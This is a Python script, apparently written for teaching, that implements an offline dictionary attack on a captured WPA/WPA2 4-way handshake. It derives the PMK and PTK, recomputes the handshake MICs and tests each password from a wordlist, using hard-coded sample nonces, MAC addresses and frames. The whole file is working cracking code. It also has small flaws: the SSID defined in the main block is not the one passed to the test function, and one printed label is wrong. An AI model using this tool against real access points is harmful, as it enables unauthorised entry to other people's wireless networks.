1.	# Used for computing HMAC  
2.	import hmac  
3.	# Used to convert from hex to binary  
4.	from binascii import a2b_hex, b2a_hex  
5.	# Used for computing PMK  
6.	from hashlib import pbkdf2_hmac, sha1, md5  
7.	  
8.	  
9.	# Pseudo-random function for generation of  
10.	# the pairwise transient key (PTK)  
11.	# key:       The PMK  
12.	# A:         b'Pairwise key expansion'  
13.	# B:         The apMac, cliMac, aNonce, and sNonce concatenated  
14.	#           like mac1 mac2 nonce1 nonce2  
15.	#           such that mac1 < mac2 and nonce1 < nonce2  
16.	# return:    The ptk  
17.	def PRF(key, A, B):  
18.	    # Number of bytes in the PTK  
19.	    nByte = 64  
20.	    i = 0  
21.	    R = b''  
22.	    # Each iteration produces 160-bit value and 512 bits are required  
23.	    while (i <= ((nByte * 8 + 159) / 160)):  
24.	        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)  
25.	        R = R + hmacsha1.digest()  
26.	        i += 1  
27.	    return R[0:nByte]  
28.	  
29.	  
30.	# Make parameters for the generation of the PTK  
31.	# aNonce:        The aNonce from the 4-way handshake  
32.	# sNonce:        The sNonce from the 4-way handshake  
33.	# apMac:         The MAC address of the access point  
34.	# cliMac:        The MAC address of the client  
35.	# return:        (A, B) where A and B are parameters  
36.	#               for the generation of the PTK  
37.	def MakeAB(aNonce, sNonce, apMac, cliMac):  
38.	    A = b"Pairwise key expansion"  
39.	    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)  
40.	    return (A, B)  
41.	  
42.	  
43.	# Compute the 1st message integrity check for a WPA 4-way handshake  
44.	# pwd:       The password to test  
45.	# ssid:      The ssid of the AP  
46.	# A:         b'Pairwise key expansion'  
47.	# B:         The apMac, cliMac, aNonce, and sNonce concatenated  
48.	#           like mac1 mac2 nonce1 nonce2  
49.	#           such that mac1 < mac2 and nonce1 < nonce2  
50.	# data:      A list of 802.1x frames with the MIC field zeroed  
51.	# return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK  
52.	def MakeMIC(pwd, ssid, A, B, data, wpa=False):  
53.	    # Create the pairwise master key  
54.	    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)  
55.	    # Make the pairwise transient key (PTK)  
56.	    ptk = PRF(pmk, A, B)  
57.	    # WPA uses md5 to compute the MIC while WPA2 uses sha1  
58.	    hmacFunc = md5 if wpa else sha1  
59.	    # Create the MICs using HMAC-SHA1 of data and return all computed values  
60.	    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]  
61.	    return (mics, ptk, pmk)  
62.	  
63.	  
64.	  
65.	  
66.	# Tests a list of passwords; if the correct one is found it  
67.	# prints it to the screen and returns it  
68.	# S:         A list of passwords to test  
69.	# ssid:      The ssid of the AP  
70.	# aNonce:    The ANonce as a byte array  
71.	# sNonce:    The SNonce as a byte array  
72.	# apMac:     The AP's MAC address  
73.	# cliMac:    The MAC address of the client (aka station)  
74.	# data:      The 802.1x frame of the second message with the MIC field zeroed  
75.	# data2:     The 802.1x frame of the third message with the MIC field zeroed  
76.	# data3:     The 802.1x frame of the forth message with the MIC field zeroed  
77.	# targMic:   The MIC for message 2  
78.	# targMic2:  The MIC for message 3  
79.	# targMic3:  The MIC for message 4  
80.	def TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data, data2, data3, targMic, targMic2, targMic3):  
81.	    # Pre-computed values  
82.	    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)  
83.	    # Loop over each password and test each one  
84.	    for i in S:  
85.	        mic, _, _ = MakeMIC(i, ssid, A, B, [data])  
86.	        v = b2a_hex(mic[0]).decode()[:-8]  
87.	        # First MIC doesn't match  
88.	        if (v != targMic):  
89.	            continue  
90.	        # First MIC matched... Try second  
91.	        mic2, _, _ = MakeMIC(i, ssid, A, B, [data2])  
92.	        v2 = b2a_hex(mic2[0]).decode()[:-8]  
93.	        if (v2 != targMic2):  
94.	            continue  
95.	        # First 2 match... Try last  
96.	        mic3, _, _ = MakeMIC(i, ssid, A, B, [data3])  
97.	        v3 = b2a_hex(mic3[0]).decode()[:-8]  
98.	        if (v3 != targMic3):  
99.	            continue  
100.	        # All of them match  
101.	        print('!!!Password Found!!!')  
102.	        print('Desired MIC1:\t\t' + targMic)  
103.	        print('Computed MIC1:\t\t' + v)  
104.	        print('\nDesired MIC2:\t\t' + targMic2)  
105.	        print('Computed MIC2:\t\t' + v2)  
106.	        print('\nDesired MIC2:\t\t' + targMic3)  
107.	        print('Computed MIC2:\t\t' + v3)  
108.	        print('Password:\t\t' + i)  
109.	        return i  
110.	    return None  
111.	  
112.	  
113.	if __name__ == "__main__":  
114.	  
115.	    # Read a file of passwords containing  
116.	    # passwords separated by a newline  
117.	    with open('pwd-dictionary2.txt') as f:  
118.	        S = []  
119.	        for l in f:  
120.	            S.append(l.strip())  
121.	    # ssid name  
122.	    ssid = "Coherer"  
123.	    # ANonce  
124.	    aNonce = a2b_hex('3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933')  
125.	    # SNonce  
126.	    sNonce = a2b_hex("cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386")  
127.	    # Authenticator MAC (AP)  
128.	    apMac = a2b_hex("000c4182b255")  
129.	    # Station address: MAC of client  
130.	    cliMac = a2b_hex("000d9382363a")  
131.	    # The first MIC  
132.	    mic1 = "a462a7029ad5ba30b6af0df391988e45"  
133.	    # The entire 802.1x frame of the second handshake message with the MIC field set to all zeros  
134.	    data1 = a2b_hex(  
135.	        "0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000")  
136.	    # The second MIC  
137.	    mic2 = "7d0af6df51e99cde7a187453f0f93537"  
138.	    # The entire 802.1x frame of the third handshake message with the MIC field set to all zeros  
139.	    data2 = a2b_hex(  
140.	        "020300af0213ca001000000000000000013e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933f57b949771c867989f49d04ed47c6934cf020000000000000000000000000000000000000000000000000000000000000050cfa72cde35b2c1e2319255806ab364179fd9673041b9a5939fa1a2010d2ac794e25168055f794ddc1fdfae3521f4446bfd11da98345f543df6ce199df8fe48f8cdd17adca87bf45711183c496d41aa0c")  
141.	    # The third MIC  
142.	    mic3 = "10bba3bdfbcfde2bc537509d71f2ecd1"  
143.	    # The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros  
144.	    data3 = a2b_hex(  
145.	        "0203005f02030a0010000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  
146.	    # Run an offline dictionary attack against the access point  
147.	    TestPwds(S, 'dd-wrt2', aNonce, sNonce, apMac, cliMac, data1, data2, data3, mic1, mic2, mic3)  
